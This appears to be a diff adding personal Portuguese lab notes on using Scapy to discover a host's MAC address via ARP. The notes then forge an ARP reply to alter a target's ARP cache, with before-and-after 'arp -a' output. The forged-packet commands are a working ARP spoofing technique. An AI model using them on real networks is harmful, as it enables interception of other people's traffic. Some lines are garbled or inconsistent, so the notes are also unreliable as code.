@@ -1,0 +1,107 @@
+Obter o endereço MAC de um determinado IP através de ARP
+
+
+>>> broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+>>> arppacket = ARP(pdst="192.168.100.1")
+>>> arppacket.show()
+###[ ARP ]### 
+  hwtype    = Ethernet (10Mb)
+  ptype     = IPv4
+  hwlen     = None
+  plen      = None
+  op        = who-has
+  hwsrc     = 08:00:27:cb:7e:f5 (meu próprio MAC ADDRESS)
+  psrc      = 192.168.100.9
+  hwdst     = 00:00:00:00:00:00
+  pdst      = 192.168.100.1
+
+>>> finalpacket = broadcast/arppacket
+>>> finalpacket.show()
+###[ Ethernet ]### 
+  dst       = ff:ff:ff:ff:ff:ff
+  src       = 08:00:27:cb:7e:f5
+  type      = ARP
+###[ ARP ]### 
+     hwtype    = Ethernet (10Mb)
+     ptype     = IPv4
+     hwlen     = None
+     plen      = None
+     op        = who-has
+     hwsrc     = 08:00:27:cb:7e:f5
+     psrc      = 192.168.100.9
+     hwdst     = 00:00:00:00:00:00
+     pdst      = 192.168.100.1
+
+>>> answer = srp(finalpacket, timeout=2, verbose=True)[0]
+Begin emission:
+Finished sending 1 packets.
+
+Received 1 packets, got 1 answers, remaining 0 packets
+>>> answer
+<Results: TCP:0 UDP:0 ICMP:0 Other:1>
+>>> mac_address = answer[0][1].hwdst
+>>> print(mac_address)
+08:00:27:cb:7e:f5
+>>> mac_address = answer[0][1].hwsrc
+>>> mac_address
+'f8:6c:e1:51:94:31' (AQUI DESCOBRIMOS O ENDEREÇO MAC DO ALVO)
+
+
+
+Atualizar a tabela de mac address de um determinado alvo
+
+
+>>> finalpacket.pdst = "192.168.100.6"
+>>> broadcast = Ebroadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+>>> answer = srp(finalpacket, timeout=2, verbose=False)[0]
+>>> answer
+<Results: TCP:0 UDP:0 ICMP:0 Other:1>
+>>> mac = answer[0][1].hwsrc
+>>> print(mac)
+f8:6c:e1:51:94:31
+.
+Sent 1 packets.
+>>> packet = ARP(op=2, hwdst="f8:6c:e1:51:94:31", pdst="192.168.100.6", psrc = "1
+...: 92.168.100.9")
+>>> send(packet, verbose=True)
+.
+Sent 1 packets.
+
+
+Antes:
+
+C:\Users\batman>arp -a
+
+Interface: 192.168.100.6 --- 0x7
+  Internet Address      Physical Address      Type
+  192.168.100.1         f8-6c-e1-51-94-31     dynamic
+  192.168.100.4         0c-91-92-7b-f1-c4     dynamic
+  192.168.100.7         28-b2-bd-66-c4-8e     dynamic
+  192.168.100.255       ff-ff-ff-ff-ff-ff     static
+  224.0.0.2             01-00-5e-00-00-02     static
+  224.0.0.22            01-00-5e-00-00-16     static
+  224.0.0.251           01-00-5e-00-00-fb     static
+  224.0.0.252           01-00-5e-00-00-fc     static
+  239.255.255.250       01-00-5e-7f-ff-fa     static
+  255.255.255.255       ff-ff-ff-ff-ff-ff     static
+  
+  
+Depois:
+
+
+C:\Users\batman>arp -a
+
+Interface: 192.168.100.6 --- 0x7
+  Internet Address      Physical Address      Type
+  192.168.100.1         f8-6c-e1-51-94-31     dynamic
+  192.168.100.4         0c-91-92-7b-f1-c4     dynamic
+  192.168.100.7         28-b2-bd-66-c4-8e     dynamic
+  192.168.100.9         08-00-27-cb-7e-f5     dynamic >> Mudança
+  192.168.100.255       ff-ff-ff-ff-ff-ff     static
+  224.0.0.2             01-00-5e-00-00-02     static
+  224.0.0.22            01-00-5e-00-00-16     static
+  224.0.0.251           01-00-5e-00-00-fb     static
+  224.0.0.252           01-00-5e-00-00-fc     static
+  239.255.255.250       01-00-5e-7f-ff-fa     static
+  255.255.255.255       ff-ff-ff-ff-ff-ff     static
+ 
